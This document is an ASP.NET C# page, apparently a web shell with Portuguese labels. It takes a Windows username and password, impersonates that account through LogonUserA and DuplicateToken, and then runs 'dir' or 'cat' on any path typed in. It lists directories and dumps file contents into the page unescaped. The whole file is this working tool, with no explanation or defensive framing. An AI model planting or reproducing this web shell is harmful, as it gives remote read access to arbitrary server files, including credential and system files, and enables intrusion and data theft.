<%@ Page Language="C#"  %>


<%@ Import Namespace = "System.Web" %>
<%@ Import Namespace = "System.Web.Security" %>
<%@ Import Namespace = "System.Security.Principal" %>
<%@ Import Namespace = "System.Runtime.InteropServices" %>

<script runat=server>
    public const int LOGON32_LOGON_INTERACTIVE = 2;
    public const int LOGON32_PROVIDER_DEFAULT = 0;

    WindowsImpersonationContext impersonationContext;

    [DllImport("advapi32.dll")]
    public static extern int LogonUserA(String lpszUserName,
    String lpszDomain,
    String lpszPassword,
    int dwLogonType,
    int dwLogonProvider,
    ref IntPtr phToken);
    [DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)]
    public static extern int DuplicateToken(IntPtr hToken,
    int impersonationLevel,
    ref IntPtr hNewToken);

    [DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)]
    public static extern bool RevertToSelf();

    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern bool CloseHandle(IntPtr handle);

    public void Page_Load(Object s, EventArgs e)
    {

    
    }

    private bool impersonateValidUser(String userName, String domain, String password)
    {
        WindowsIdentity tempWindowsIdentity;
        IntPtr token = IntPtr.Zero;
        IntPtr tokenDuplicate = IntPtr.Zero;

        if(RevertToSelf())
        {
            if(LogonUserA(userName, domain, password, LOGON32_LOGON_INTERACTIVE,
            LOGON32_PROVIDER_DEFAULT, ref token)!= 0)
            {
                if(DuplicateToken(token, 2, ref tokenDuplicate)!= 0)
                {
                    tempWindowsIdentity = new WindowsIdentity(tokenDuplicate);
                    impersonationContext = tempWindowsIdentity.Impersonate();
                    if (impersonationContext != null)
                    {
                        CloseHandle(token);
                        CloseHandle(tokenDuplicate);
                        return true;
                    }
                }
            }
        }
        if(token!= IntPtr.Zero)
            CloseHandle(token);
        if(tokenDuplicate!=IntPtr.Zero)
            CloseHandle(tokenDuplicate);
        return false;
    }

    private void undoImpersonation()
    {
        impersonationContext.Undo();
    }

    protected void cmdExecute_Click(object sender, EventArgs e)
    {
            if(impersonateValidUser(this.txtUserName.Text, ".", this.txtPassword.Text))
        {
            this.litResult.Text = User.Identity.Name + "<br/>";
            string[] command = this.txtCommand.Text.Split(new char[] { ' ' });
            if (command[0].Equals("dir"))
            {
                string[] files = System.IO.Directory.GetFiles(command[1]);
                foreach(string f in files)
                {
                    this.litResult.Text += f+"<br/>";
                }
            }
            else if(command[0].Equals("cat"))
            {
                this.litResult.Text = System.IO.File.ReadAllText(command[1]);
            }

            //Insert your code that runs under the security context of a specific user here.
            undoImpersonation();
        }
        else
        {
            //Your impersonation failed. Therefore, include a fail-safe mechanism here.
        }
    }
</script>
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
</head>
<body>
    <form id="form1" runat="server">
        <div>
           User: <asp:TextBox ID="txtUserName" runat="server"></asp:TextBox>
        </div>
        <div>
            Password: <asp:TextBox ID="txtPassword" runat="server"></asp:TextBox>
        </div>
        <div>
            Comando: <asp:TextBox ID="txtCommand" runat="server"></asp:TextBox>
        </div>

        <div>
            Resultado: <br />
            
            <asp:Literal ID="litResult" runat="server"></asp:Literal>
        </div>

        <div>

            <asp:Button ID="cmdExecute" runat="server" Text="Execute" OnClick="cmdExecute_Click" />
        </div>
    </form>
</body>
</html>
